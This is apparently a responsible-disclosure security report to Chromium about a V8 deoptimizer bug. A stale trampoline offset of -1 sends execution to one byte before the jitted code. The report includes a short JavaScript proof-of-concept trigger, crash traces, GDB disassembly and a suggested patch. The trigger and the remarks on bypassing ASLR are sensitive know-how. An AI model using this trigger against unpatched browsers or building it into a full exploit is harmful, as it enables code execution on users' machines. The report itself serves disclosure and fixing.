<b>VULNERABILITY DETAILS</b>
In v8, it is possible to enter a state where there is an inconsistency with code being marked for deoptimization. For a debug build, this results in a DCHECK failure like
# Fatal error in ../../../src/deoptimizer/deoptimizer.cc, line 278
# Debug check failed: code == topmost_ implies safe_to_deopt_.


In a normal release build (without DCHECK), the bug is much worse: the calculation performed in the surrounding code in deoptimizer calculates a new pc value to use to jump to the deoptimized code. An offset value (trampoline_pc) is fetched, but in this erroneous state, the offset is still the default value of -1.
( see https://source.chromium.org/chromium/chromium/src/+/master:v8/src/deoptimizer/deoptimizer.cc;l=268
and 
https://source.chromium.org/chromium/chromium/src/+/master:v8/src/codegen/safepoint-table.h;l=24
)

This results in setting pc to one byte before the start of the jitted code.
Depending on the exact instructions used, and the data in the region immediately before the jitted code, this can lead to code execution, with no need to worry about ASLR (as v8 adjusts the pc relative to the existing code buffer), or any fancy pointer signing stuff.

The simplest patch would maybe be a check that safepoint.has_deoptimization_index() or that trampoline_pc is non-negative, or another similar check like maybe code.CanDeoptAt(it.frame()->pc()) to guard the deoptimization path.


<b>VERSION</b>
Chrome Version: master
[ looks like the bug was introduced in https://chromium.googlesource.com/v8/v8/+/a447a44f31fc153590598698d33d6efd73334be4 
so v8 >= 8.3.42 ]
Operating System: all

<b>REPRODUCTION CASE</b>
for (let i = 0; i < 3; i++) {
    for (let j = 0; j < 32767; j++) {
        Number;
    }
    for (let j = 0; j < 2335; j++) {
        Number;
    }
    var arr = [, ...(new Int16Array(0xffff)), 4294967296];
    arr.concat(Number, arr)
}
eval(``);

(also attached)

<b>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION</b>
Type of crash: v8
Crash State: 

For a debug build:

$ v8/v8/src/out/debug/d8 poc_minimized.js


#
# Fatal error in ../../../src/deoptimizer/deoptimizer.cc, line 278
# Debug check failed: code == topmost_ implies safe_to_deopt_.
#
#
#
#FailureMessage Object: 0x7ffee9a61060
==== C stack trace ===============================

    v8/v8/src/out/debug/d8(v8::base::debug::StackTrace::StackTrace()+0x22) [0x556ec3dfe8f2]
    v8/v8/src/out/debug/d8(+0xbd9ed7) [0x556ec3df9ed7]
    v8/v8/src/out/debug/d8(V8_Fatal(char const*, int, char const*, ...)+0x16e) [0x556ec3dec57e]
    v8/v8/src/out/debug/d8(+0xbcbd55) [0x556ec3debd55]
    v8/v8/src/out/debug/d8(+0xfb4a6b) [0x556ec41d4a6b]
    v8/v8/src/out/debug/d8(v8::internal::Deoptimizer::DeoptimizeMarkedCodeForContext(v8::internal::NativeContext)+0xb7e) [0x556ec41d3d0e]
    v8/v8/src/out/debug/d8(v8::internal::Deoptimizer::DeoptimizeMarkedCode(v8::internal::Isolate*)+0x256) [0x556ec41d5756]
    v8/v8/src/out/debug/d8(v8::internal::DependentCode::DeoptimizeDependentCodeGroup(v8::internal::DependentCode::DependencyGroup)+0x84) [0x556ec478b464]
    v8/v8/src/out/debug/d8(bool v8::internal::AllocationSite::DigestTransitionFeedback<(v8::internal::AllocationSiteUpdateMode)0>(v8::internal::Handle<v8::internal::AllocationSite>, v8::internal::ElementsKind)+0xb2d) [0x556ec4a338ad]
    v8/v8/src/out/debug/d8(bool v8::internal::JSObject::UpdateAllocationSite<(v8::internal::AllocationSiteUpdateMode)0>(v8::internal::Handle<v8::internal::JSObject>, v8::internal::ElementsKind)+0x59c) [0x556ec4a32bac]
    v8/v8/src/out/debug/d8(+0x160dcfe) [0x556ec482dcfe]
    v8/v8/src/out/debug/d8(+0x16062e5) [0x556ec48262e5]
    v8/v8/src/out/debug/d8(v8::internal::JSObject::AddDataElement(v8::internal::Handle<v8::internal::JSObject>, unsigned int, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes)+0xb76) [0x556ec4a882e6]
    v8/v8/src/out/debug/d8(v8::internal::Object::AddDataProperty(v8::internal::LookupIterator*, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin)+0xd4b) [0x556ec4bd58cb]
    v8/v8/src/out/debug/d8(v8::internal::JSObject::DefineOwnPropertyIgnoreAttributes(v8::internal::LookupIterator*, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::JSObject::AccessorInfoHandling)+0x2c0) [0x556ec4a4be00]
    v8/v8/src/out/debug/d8(+0x17cb302) [0x556ec49eb302]
    v8/v8/src/out/debug/d8(+0x17d964e) [0x556ec49f964e]
    v8/v8/src/out/debug/d8(+0x30405ff) [0x556ec62605ff]
Received signal 4 ILL_ILLOPN 556ec3df6226
Illegal instruction



For a non-debug build:
v8/v8/src/out/normal/d8 poc_minimized.js
Received signal 11 SEGV_MAPERR 55e0e44fd079

==== C stack trace ===============================

 [0x55e0e19c2b57]
 [0x7f267b267980]
 [0x2da90008731f]
[end of stack trace]
Segmentation fault


And in GDB:
Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x000009a80008731f in ?? ()
(gdb) x/5i $pc
=> 0x9a80008731f:	add    %cl,0x349d059(%rbx)
   0x9a800087325:	(bad)  
   0x9a800087327:	rex.XB (bad) 
   0x9a800087329:	add    %esi,0x49(%rbp,%rcx,1)
   0x9a80008732d:	mov    $0x5678ab80,%edx
(gdb) p/x $rbx
$3 = 0x555555fae020
(gdb) p/x $rbx + 0x349d059
$5 = 0x55555944b079
(gdb) x/5i $pc+1
   0x9a800087320:	mov    -0x30(%rcx),%ebx
   0x9a800087323:	add    %r13,%rbx
   0x9a800087326:	testb  $0x1,0x7(%rbx)
   0x9a80008732a:	je     0x9a800087339
   0x9a80008732c:	movabs $0x55555678ab80,%r10
(gdb) 



<b>CREDIT INFORMATION</b>
Reporter credit: Tyler Nighswander (@tylerni7) of Theori

